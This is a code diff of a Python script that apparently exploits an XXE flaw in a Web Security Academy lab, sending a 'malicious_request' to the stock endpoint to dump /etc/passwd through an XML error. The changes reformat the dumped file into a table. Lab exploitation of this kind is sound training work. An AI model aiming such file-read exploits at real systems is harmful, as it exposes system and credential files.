@@ -50,9 +50,12 @@
 import typer
 import requests
 from rich.console import Console
+from rich.table import Table
 from termcolor import colored
 
 console = Console()
+table = Table(title="/etc/passwd")
+table.add_column("Users",style="magenta")
 
 def malicious_request(session, sid):
     response = session.post(f'https://{sid}.web-security-academy.net/product/stock/', data=(
@@ -70,12 +73,19 @@ def main(sid: str):
     if (response.status_code == 400):
         console.log('+ XML error was succesfully produced!')
         #CHECK THE CORRECTNESS OF THE OUTPUT
-        log = response.text.split(" ")
-        nonexistent = log[6].split("\n")
+        log = response.text.split("\n")
+        lines = []
+        first = log[0].split(" ")
+        lines.append(first[6])
+        for i in range (1, len(log)):
+            lines.append(log[i])
 
-        if ('/nonexistent/root:x:0:0:root:/root:/bin/bash' in nonexistent):
+        if ('/nonexistent/root:x:0:0:root:/root:/bin/bash' in lines):
             console.log('+ The file /etc/passwd was correctly dumped!')
-            print(response.text)
+            print("\n")
+            for line in lines:
+                table.add_row(line)
+            console.print(table)
         else:
             console.log('+ The attack was unsuccesful!')
 
